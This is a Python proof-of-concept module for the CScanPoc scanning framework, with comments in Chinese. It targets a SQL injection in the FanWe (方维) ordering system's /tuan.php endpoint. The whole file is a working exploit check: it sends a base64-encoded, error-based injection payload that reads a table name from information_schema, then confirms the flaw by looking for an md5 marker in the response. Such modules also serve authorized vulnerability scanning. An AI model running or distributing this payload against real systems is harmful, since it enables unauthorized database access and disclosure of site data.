# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'FanWe_0011'  # 平台漏洞编号，留空
    name = '方维订餐系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-10'  # 漏洞公布时间
    desc = '''
        方维订餐系统 /tuan.php 参数过滤不完整，报错，产生注入。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'FanWe(方维)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e615ac99-5c2d-4ef2-9c0e-0539b2c68431'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/tuan.php?ctl=subscribe&act=unsubscribe&code=J2FuZChzZWxlY3QgMSBmcm9tKHNlbGVjdCBjb3VudCgqKSxjb25jYXQoKHNlbGVjdCBjb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIGxpbWl0IDAsMSksY29uY2F0KDB4N2UsbWQ1KDEpKSxmbG9vcihyYW5kKDApKjIpKXggZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IHgpYSlhbmQnLS0="
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b1" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
